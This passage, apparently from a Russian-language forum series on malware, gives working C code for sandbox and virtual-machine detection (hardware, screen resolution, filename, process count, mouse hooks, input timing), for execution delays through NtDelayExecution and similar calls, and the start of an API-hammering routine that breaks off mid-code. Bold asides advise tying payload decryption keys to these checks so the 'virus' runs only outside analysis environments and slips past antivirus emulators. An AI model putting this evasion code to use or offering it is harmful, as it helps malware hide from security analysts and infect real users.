	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL IsVenvByHardwareCheck() {

    SYSTEM_INFO SysInfo = { 0 };
    MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };
    HKEY hKey = NULL;
    DWORD dwUsbNumber = NULL;
    DWORD dwRegErr = NULL;

    // ПРОВЕРКА ЦПУ
    GetSystemInfo(&amp;SysInfo);

    // Менее 2 процессоров
    if (SysInfo.dwNumberOfProcessors &lt; 2) {
        return TRUE;
    }

    // ПРОВЕРКА ОПЕРАТИВНОЙ ПАМЯТИ (RAM)
    if (!GlobalMemoryStatusEx(&amp;MemStatus)) {
        printf(&quot;\n\t[!] GlobalMemoryStatusEx завершился с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Менее 2 гб оперативной памяти
    if ((DWORD)MemStatus.ullTotalPhys &lt; (DWORD)(2 * 1073741824)) {
        return TRUE;
    }

    // ПРОВЕРКА КОЛИЧЕСТВА РАНЕЕ ПОДКЛЮЧЕННЫХ USB-УСТРОЙСТВ
    if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, NULL, KEY_READ, &amp;hKey)) != ERROR_SUCCESS) {
        printf(&quot;\n\t[!] RegOpenKeyExA завершился с ошибкой: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
        return FALSE;
    }

    if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &amp;dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
        printf(&quot;\n\t[!] RegQueryInfoKeyA завершился с ошибкой: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
        return FALSE;
    }

    // Менее 2 ранее подключенных USB-устройств
    if (dwUsbNumber &lt; 2) {
        return TRUE;
    }

    RegCloseKey(hKey);

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через разрешение машины</b><br />
<br />
В песочной среде разрешение и свойства отображения машины часто устанавливаются на стандартизированное и постоянное значение, которое может отличаться от разрешения и свойств отображения реальной машины. Поэтому машины с низким разрешением могут служить индикатором виртуализированной среды.<br />
<br />
С программной точки зрения первым шагом будет перечисление мониторов отображения системы с использованием функции EnumDisplayMonitors WinAPI.<br />
<br />
Функция EnumDisplayMonitors требует выполнения функции обратного вызова для каждого обнаруженного монитора отображения, в этой функции обратного вызова должна вызываться функция GetMonitorInfoW WinAPI. Эта функция извлекает разрешение монитора отображения.<br />
<br />
Информация, полученная от GetMonitorInfoW, возвращается как структура MONITORINFO, которая показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagMONITORINFO {
  DWORD cbSize;       // Размер структуры
  RECT  rcMonitor;    // Прямоугольник монитора отображения, выраженный в координатах виртуального экрана
  RECT  rcWork;       // Прямоугольник рабочей области монитора отображения, выраженный в координатах виртуального экрана
  DWORD dwFlags;      // Представляет атрибуты монитора отображения
} MONITORINFO, *LPMONITORINFO;</code></pre>
	</div>
</div><br />
Член rcMonitor содержит необходимую информацию. Этот член также является структурой типа RECT, которая определяет прямоугольник через координаты его верхнего левого и нижнего правого углов.<br />
<br />
После извлечения значений структуры RECT выполняются вычисления для определения фактических координат отображения:<br />
<br />
MONITORINFO.rcMonitor.right - MONITORINFO.rcMonitor.left - Это дает нам ширину (значение X).<br />
MONITORINFO.rcMonitor.top - MONITORINFO.rcMonitor.bottom - Это дает нам высоту (значение Y).<br />
<br />
<b>Антивиртуализация через разрешение машины (код) </b><br />
<br />
Функция CheckMachineResolution использует описанный процесс, при котором вычисляется разрешение машины, путем выполнения функции обратного вызова ResolutionCallback.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Функция обратного вызова, вызываемая всякий раз, когда &#039;EnumDisplayMonitors&#039; обнаруживает монитор
BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata) {

    int X = 0,
        Y = 0;
    MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };

    if (!GetMonitorInfoW(hMonitor, &amp;MI)) {
        printf(&quot;\n\t[!] GetMonitorInfoW завершился с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Вычисление координат X отображения
    X = MI.rcMonitor.right - MI.rcMonitor.left;

    // Вычисление координат Y отображения
    Y = MI.rcMonitor.top - MI.rcMonitor.bottom;

    // Если числа отрицательные, меняем их
    if (X &lt; 0)
        X = -X;
    if (Y &lt; 0)
        Y = -Y;

    if ((X != 1920 &amp;&amp; X != 2560 &amp;&amp; X != 1440) || (Y != 1080 &amp;&amp; Y != 1200 &amp;&amp; Y != 1600 &amp;&amp; Y != 900))
        *((BOOL*)ldata) = TRUE; // обнаружена песочница

    return TRUE;
}

BOOL CheckMachineResolution() {

    BOOL SANDBOX = FALSE;

    // SANDBOX будет установлен в TRUE &#039;EnumDisplayMonitors&#039;, если обнаружена песочница
    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, (LPARAM)(&amp;SANDBOX));

    return SANDBOX;
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через имя файла</b><br />
<br />
Песочницы часто переименовывают файлы в качестве метода классификации (например, переименовывают файл в его хэш MD5). Этот процесс обычно приводит к произвольному имени файла смешанными буквами и цифрами.<br />
<br />
Функция ExeDigitsInNameCheck, показанная ниже, используется для подсчета количества цифр в текущем имени файла. Она использует функцию GetModuleFileNameA для получения имени файла (включая путь) и затем PathFindFileNameA для разделения имени файла от пути.<br />
<br />
Затем используется функция isdigit для определения, являются ли символы в имени файла цифрами. Если в имени файла содержится более 3 цифр, то ExeDigitsInNameCheck предполагает, что это песочница, и возвращает TRUE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ExeDigitsInNameCheck() {

    CHAR Path[MAX_PATH * 3];
    CHAR cName[MAX_PATH];
    DWORD dwNumberOfDigits = NULL;

    // Получение текущего имени файла (с полным путем)
    if (!GetModuleFileNameA(NULL, Path, MAX_PATH * 3)) {
        printf(&quot;\n\t[!] GetModuleFileNameA завершился с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Защита от переполнения буфера - получение имени файла из полного пути
    if (lstrlenA(PathFindFileNameA(Path)) &lt; MAX_PATH)
        lstrcpyA(cName, PathFindFileNameA(Path));

    // Подсчет количества цифр
    for (int i = 0; i &lt; lstrlenA(cName); i++) {
        if (isdigit(cName[i]))
            dwNumberOfDigits++;
    }

    // Максимальное допустимое количество цифр: 3
    if (dwNumberOfDigits &gt; 3) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через количество работающих процессов</b><br />
<br />
Еще одним способом обнаружения виртуализированной среды является проверка количества работающих процессов в системе. Песочницы обычно не имеют много приложений установленных и, следовательно, имеют меньше работающих процессов. Как и в предыдущих методах, это не является универсальным методом, который гарантированно определит систему как песочницу. В системе Windows должно быть как минимум 60-70 работающих процессов.<br />
<br />
Процессы будут перечисляться с использованием методики EnumProcesses. Функция CheckMachineProcesses возвращает TRUE, если она обнаруживает песочницу, то есть если в системе запущено менее 50 процессов.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CheckMachineProcesses() {

    DWORD adwProcesses[1024];
    DWORD dwReturnLen = NULL,
        dwNmbrOfPids = NULL;

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &amp;dwReturnLen)) {
        printf(&quot;\n\t[!] EnumProcesses завершился с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen / sizeof(DWORD);

    // Если менее 50 процессов, возможно, это песочница
    if (dwNmbrOfPids &lt; 50)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через взаимодействие с пользователем</b><br />
<br />
Песочницы часто работают в безголовом окружении, то есть без дисплея или периферийных устройств, таких как клавиатура и мышь. Безголовые окружения также обычно автоматизированы и запускаются сценариями или другими инструментами. Отсутствие взаимодействия с пользователем может быть индикатором возможного песочничного окружения. Например, вредоносное программное обеспечение может проверить, не поступило ли в окружение ни одного щелчка мыши или нажатия клавиши в течение определенного периода.<br />
<br />
Вспомните Кунгфу-2.Изучаем API Hooking | Цикл статей &quot;Изучение вредоносных программ&quot;, где использовались функции SetWindowsHookExW и CallNextHookEx WinAPI для отслеживания щелчков мыши. Та же самая техника применяется в следующей функции, MouseClicksLogger. Если в течение 20 секунд она не получает более 5 щелчков мыши, то предполагается, что находится в песочничной среде.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Мониторинг щелчков мыши в течение 20 секунд
#define MONITOR_TIME   20000 // Глобальная переменная для хранения обработчика глобального хука
HHOOK g_hMouseHook = NULL;
// Глобальный счетчик щелчков мыши
DWORD g_dwMouseClicks = NULL;

// Функция обратного вызова, которая будет выполнена при щелчке мыши пользователем
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         &quot;Щелчок правой кнопкой мыши&quot;
    // WM_LBUTTONDOWN :         &quot;Щелчок левой кнопкой мыши&quot;
    // WM_MBUTTONDOWN :         &quot;Щелчок средней кнопкой мыши&quot;

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf(&quot;[+] Зарегистрирован щелчок мыши \n&quot;);
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

    // Установка хука
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW завершился с ошибкой: %d \n&quot;, GetLastError());
    }

    // Обработка неперехваченных событий
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

int main() {

    HANDLE hThread = NULL;

    // ...

    // Запуск потока для отслеживания щелчков мыши
    if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, 0, NULL))) {
        printf(&quot;[!] CreateThread завершился с ошибкой: %d \n&quot;, GetLastError());
        return 1;
    }

    // ...

    // Ожидание завершения потока
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через скорость взаимодействия с пользователями</b><br />
<br />
Скорость взаимодействия с пользователем также может быть использована в антивиртуализации. Песочницы могут работать с определенной фиксированной скоростью, в то время как реальные пользователи будут взаимодействовать с системой несколько более непредсказуемо. Например, если в течение короткого периода времени происходит слишком много взаимодействий с пользователем, это может указывать на наличие песочницы.<br />
<br />
В приведенной ниже функции MonitorUserActivity, мы следим за интервалом времени между последним взаимодействием пользователя с клавиатурой или мышью. Если интервал слишком короткий, это может быть признаком того, что система находится в виртуализированной среде.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL MonitorUserActivity() {

    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    DWORD dwLastInputTime = NULL;
    DWORD dwCurrentTime = NULL;
    DWORD dwElapsedTime = NULL;

    // Получение времени последнего ввода
    if (!GetLastInputInfo(&amp;dwLastInputTime)) {
        printf(&quot;\n\t[!] GetLastInputInfo завершился с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Получение текущего времени
    dwCurrentTime = GetTickCount();

    // Вычисление времени бездействия
    dwElapsedTime = dwCurrentTime - dwLastInputTime;

    // Если время бездействия менее 5 секунд, предполагаем, что это песочница
    if (dwElapsedTime &lt; 5000) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Важно ещё то-что, эти методы, также как и методы антидебага из предыдущей статьи, можно использовать для получения ключа пароля, например зашифрованного пейлоада, в случае если вирус не запущен под виртуальной системы, то пейлоад запустится, иначе нет.<br />
Необязательно возвращать true и else, можно возвращать числовые значения, например число процессов, разрешение экрана и т.д. и на основе этих данных генерировать уже ключ.)</b><br />
<br />
Обратите внимание, что приведенные выше методы антивиртуализации могут быть полезными в некоторых случаях, но они не гарантируют 100% определения виртуализированной среды. Виртуализация и антивиртуализация - это постоянное соревнование, и вредоносные программы могут разрабатываться с учетом этих методов антивиртуализации. Также важно помнить, что использование антивиртуализации может привести к ложным срабатываниям в реальных средах, что может вызвать проблемы для пользователей.<br />
<br />
<u><b>Давайте теперь рассмотрим способы обхода эмулятора антивируса, по сути это тоже виртуальная среда, только в движке антивируса.</b></u><br />
<b><u>Рекомендуется это использовать с методами выше, но важно это использовать для генерации каких-то критичных данных, например ключа для расшифровки или ещё что-то.</u></b><br />
<br />
Задержка выполнения - это общая техника, используемая для обхода изолированных сред. В песочницах обычно устанавливаются временные ограничения, которые не позволяют анализировать бинарный файл в течение длительного времени. Поэтому вредоносное программное обеспечение может внести длительные паузы в выполнение кода, что заставит песочницу завершить работу до того, как она сможет проанализировать бинарный файл.<br />
<br />
Если у песочницы есть ограничение на анализ в течение двух минут, она не сможет проанализировать полезную нагрузку, если образец вредоносного программного обеспечения выполняет функцию ожидания в течение трех минут перед расшифровкой и выполнением её.<br />
<br />
Эта статья представит функции, которые можно использовать для задержки выполнения полезной нагрузки.<br />
<br />
Несколько образцов вредоносного программного обеспечения использовали задержки в выполнении, поэтому большинство песочниц применили меры по устранению задержек в выполнении. Такие меры могут включать в себя ускорение задержек, либо изменяя параметры, передаваемые через перехват API, либо другими способами. <b>Проверка того, что задержка произошла, является важной, и её можно достичь с помощью WinAPI, GetTickCount64.</b><br />
<br />
Функция задержки может выглядеть примерно так:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayFunction(DWORD dwMilliSeconds) {

  DWORD T0 = GetTickCount64();

  // Код, необходимый для задержки выполнения на &#039;dwMilliSeconds&#039; миллисекунд

  DWORD T1 = GetTickCount64();

  // Прошло как минимум &#039;dwMilliSeconds&#039; миллисекунд, значит, &#039;DelayFunction&#039; выполнена успешно
  if ((DWORD)(T1 - T0) &lt; dwMilliSeconds)
    return FALSE;
  else
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с использованием WaitForSingleObject</b><br />
<br />
WinAPI WaitForSingleObject использовался на протяжении всего этого курса для ожидания наступления сигнала у конкретного объекта или для завершения тайм-аута. В этом разделе WaitForSingleObject будет использоваться для ожидания пустого события, созданного с использованием CreateEvent, что означает ожидание истечения тайм-аута.<br />
<br />
Функция DelayExecutionVia_WFSO имеет один параметр, ftMinutes, который представляет собой время задержки выполнения в минутах. Функция возвращает TRUE, если WaitForSingleObject успешно задерживает выполнение на указанное время.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayExecutionVia_WFSO(FLOAT ftMinutes) {

  // Преобразование минут в миллисекунды
  DWORD     dwMilliSeconds  = ftMinutes * 60000;
  HANDLE    hEvent          = CreateEvent(NULL, NULL, NULL, NULL);
  DWORD     _T0             = NULL,
            _T1             = NULL;


  _T0 = GetTickCount64();

  // Ожидание в течение &#039;dwMilliSeconds&#039; мс
  if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED) {
    printf(&quot;[!] WaitForSingleObject Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
  }

  _T1 = GetTickCount64();

  // Прошло как минимум &#039;dwMilliSeconds&#039; миллисекунд, значит, &#039;DelayExecutionVia_WFSO&#039; выполнена успешно
  if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
    return FALSE;

  CloseHandle(hEvent);

  return TRUE;

}</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с использованием MsgWaitForMultipleObjectsEx</b><br />
<br />
Другим WinAPI, который можно использовать для задержки выполнения, является WinAPI MsgWaitForMultipleObjectsEx. Он выполняет ту же задачу, что и WaitForSingleObject, и также демонстрировался в предыдущих статьях.<br />
<br />
Функция DelayExecutionVia_MWFMOEx использует ту же логику, показанную в предыдущем разделе, за исключением того, что здесь используется WinAPI MsgWaitForMultipleObjectsEx. Функция имеет один параметр, ftMinutes, который представляет собой время задержки выполнения в минутах. Функция возвращает TRUE, если MsgWaitForMultipleObjectsEx успешно задерживает выполнение на указанное время.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayExecutionVia_MWFMOEx(FLOAT ftMinutes) {

  // Преобразование минут в миллисекунды
  DWORD   dwMilliSeconds    = ftMinutes * 60000;
  HANDLE  hEvent            = CreateEvent(NULL, NULL, NULL, NULL);
  DWORD   _T0               = NULL,
          _T1               = NULL;


  _T0 = GetTickCount64();

  // Ожидание в течение &#039;dwMilliSeconds&#039; мс
  if (MsgWaitForMultipleObjectsEx(1, &amp;hEvent, dwMilliSeconds, QS_HOTKEY, NULL) == WAIT_FAILED) {
    printf(&quot;[!] MsgWaitForMultipleObjectsEx Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
  }

  _T1 = GetTickCount64();

  // Прошло как минимум &#039;dwMilliSeconds&#039; миллисекунд, значит, &#039;DelayExecutionVia_MWFMOEx&#039; выполнена успешно
  if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
    return FALSE;

  CloseHandle(hEvent);

  return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с использованием NtWaitForSingleObject</b><br />
<br />
Задержки выполнения кода также можно выполнять с использованием системного вызова NtWaitForSingleObject. NtWaitForSingleObject - это нативная версия API WaitForSingleObject и выполняет ту же функцию. NtWaitForSingleObject показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtWaitForSingleObject(
  [in] HANDLE         Handle,       // Дескриптор объекта ожидания
  [in] BOOLEAN        Alertable,    // Можно ли доставить оповещение, когда объект находится в ожидании
  [in] PLARGE_INTEGER Timeout       // Указатель на структуру LARGE_INTEGER, указывающую время ожидания
);</code></pre>
	</div>
</div><br />
Время ожидания для NtWaitForSingleObject задается в интервалах 100 наносекунд, которые часто называются тактами. Один такт эквивалентен 0,0001 миллисекунды. Значение, передаваемое через системный вызов через параметр Timeout, должно быть значением dwMilliSeconds x 10000, где dwMilliSeconds - это время ожидания в миллисекундах.<br />
<br />
Функция DelayExecutionVia_NtWFSO ниже использует системный вызов NtWaitForSingleObject для задержки выполнения на указанное время, указанное параметром ftMinutes. ftMinutes представляет собой время задержки выполнения в минутах. Функция возвращает TRUE, если NtWaitForSingleObject успешно задерживает выполнение на указанное время.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnNtWaitForSingleObject)(
    HANDLE         Handle,
    BOOLEAN        Alertable,
    PLARGE_INTEGER Timeout
);

BOOL DelayExecutionVia_NtWFSO(FLOAT ftMinutes) {

     // Преобразование минут в миллисекунды
    DWORD                   dwMilliSeconds          = ftMinutes * 60000;
    HANDLE                  hEvent                  = CreateEvent(NULL, NULL, NULL, NULL);
    LONGLONG                Delay                   = NULL;
    NTSTATUS                STATUS                  = NULL;
    LARGE_INTEGER           DelayInterval           = { 0 };
    fnNtWaitForSingleObject pNtWaitForSingleObject  = (fnNtWaitForSingleObject)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtWaitForSingleObject&quot;);
    DWORD                   _T0                     = NULL,
                            _T1                     = NULL;

      // Преобразование из миллисекунд в интервал времени с интервалами 100 наносекунд
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount64();

      // Ожидание в течение &#039;dwMilliSeconds&#039; мс
    if ((STATUS = pNtWaitForSingleObject(hEvent, FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

      // Прошло как минимум &#039;dwMilliSeconds&#039; миллисекунд, значит, &#039;DelayExecutionVia_NtWFSO&#039; выполнена успешно
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    CloseHandle(hEvent);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с использованием NtDelayExecution</b><br />
<br />
Последний метод для задержки выполнения - использование системного вызова NtDelayExecution. Название явно указывает на то, что этот системный вызов предназначен для задержки выполнения кода для синхронизации.<br />
NtDelayExecution похож на NtWaitForSingleObject, за исключением того, что для ожидания объектного дескриптора не требуется; его функциональность аналогична Sleep, приостанавливающему выполнение текущего цикла кода. NtDelayExecution показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtDelayExecution(
    IN BOOLEAN              Alertable,      // Можно ли доставить оповещение, когда объект находится в ожидании
    IN PLARGE_INTEGER       DelayInterval   // Указатель на структуру LARGE_INTEGER, указывающую время ожидания
);</code></pre>
	</div>
</div><br />
NtDelayExecution использует такты для параметра DelayInterval.<br />
<br />
Функция DelayExecutionVia_NtDE ниже использует системный вызов NtDelayExecution для задержки выполнения на указанное время ftMinutes, которое представляет собой время ожидания в минутах. Функция возвращает TRUE, если NtDelayExecution успешно задерживает выполнение на указанное время.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI *fnNtDelayExecution)(
    BOOLEAN              Alertable,
    PLARGE_INTEGER       DelayInterval
);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

      // Преобразование минут в миллисекунды
    DWORD               dwMilliSeconds        = ftMinutes * 60000;
    LARGE_INTEGER       DelayInterval         = { 0 };
    LONGLONG            Delay                 = NULL;
    NTSTATUS            STATUS                = NULL;
    fnNtDelayExecution  pNtDelayExecution     = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
    DWORD               _T0                   = NULL,
                        _T1                   = NULL;

      // Преобразование из миллисекунд в интервал времени с отрицательными интервалами 100 наносекунд
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount64();

    // Ожидание в течение &#039;dwMilliSeconds&#039; мс
    if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtDelayExecution Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

    // Прошло как минимум &#039;dwMilliSeconds&#039; миллисекунд, значит, &#039;DelayExecutionVia_NtDE&#039; выполнена успешно
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>API Hammering</b> - это техника обхода песочницы, при которой происходит быстрый вызов случайных функций WinAPI для задержки выполнения программы. Это также может использоваться для затруднения отслеживания стека вызовов в работающих потоках. Это означает, что злонамеренные вызовы функций в логике программы будут скрыты случайными вызовами безвредных функций WinAPI.<br />
<br />
В этом разделе будет продемонстрирована техника API Hammering двумя способами. Первый метод выполняет API Hammering в фоновом потоке, который вызывает различные функции WinAPI из основного потока, где выполняется злонамеренный код. Второй метод использует API Hammering для задержки выполнения с помощью операций, требующих много времени.<br />
<br />
Функции ввода-вывода API Hammering может использовать любые функции WinAPI, однако в этом модуле будут использованы следующие три функции WinAPI.<br />
<br />
CreateFileW - используется для создания и открытия файла.<br />
<br />
WriteFile - используется для записи данных в файл.<br />
<br />
ReadFile - используется для чтения данных из файла.<br />
<br />
Эти функции WinAPI были выбраны из-за их способности потреблять значительное количество времени при работе с большими объемами данных, что делает их подходящими для API Hammering.<br />
<br />
<b>Процесс API Hammering</b><br />
<br />
Функция CreateFileW будет использоваться для создания временного файла в папке временных файлов Windows. Обычно в этой папке хранятся файлы .tmp, созданные операционной системой Windows или сторонними приложениями. Эти временные файлы часто используются для хранения временных данных во время вычислительных процессов, таких как установка приложения или загрузка файлов из Интернета. После завершения задач эти файлы обычно удаляются.<br />
<br />
После создания файла .tmp в него будет записан буфер, сгенерированный случайным образом и фиксированного размера, с использованием функции WriteFile WinAPI. После этого дескриптор файла закрывается и затем снова открывается с использованием функции CreateFileW. На этот раз будет использован специальный флаг для пометки файла для удаления после закрытия его дескриптора.<br />
<br />
Перед закрытием дескриптора будет использоваться функция ReadFile для чтения данных, записанных ранее, в локальный буфер. Затем этот буфер будет очищен и освобожден, и, наконец, закроется дескриптор файла, что приведет к его удалению.<br />
<br />
Можно четко видеть, что вышеуказанные задачи не имеют смысла, но затратны по времени. Кроме того, все вышеперечисленное будет выполнено внутри цикла.<br />
<br />
<b>Также можно использовать генерацию данных для записи в файл и проверку его правильности после считывания, а также использования этих данных в качестве ключа.</b><br />
<br />
Функция ApiHammering ниже выполняет описанные выше шаги. Единственным параметром, который требуется для этой функции, является dwStress, который представляет собой количество повторений всего процесса.<br />
<br />
Остальной код должен выглядеть знакомо, за исключением функции WinAPI GetTempPathW, которая используется для получения пути к папке временных файлов C:\Users&lt;username&gt;\AppData\Local\Temp. Затем к этому пути добавляется имя файла TMPFILE, и оно передается функции CreateFileW.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Имя файла для создания
#define TMPFILE L&quot;RuSfera.tmp&quot;

BOOL ApiHammering(DWORD dwStress) {

    WCHAR     szPath                  [MAX_PATH * 2],
              szTmpPath               [MAX_PATH];
    HANDLE    hRFile                  = INVALID_HANDLE_VALUE,
              hWFile                  = INVALID_HANDLE_VALUE;

    DWORD   dwNumberOfBytesRead       = NULL,
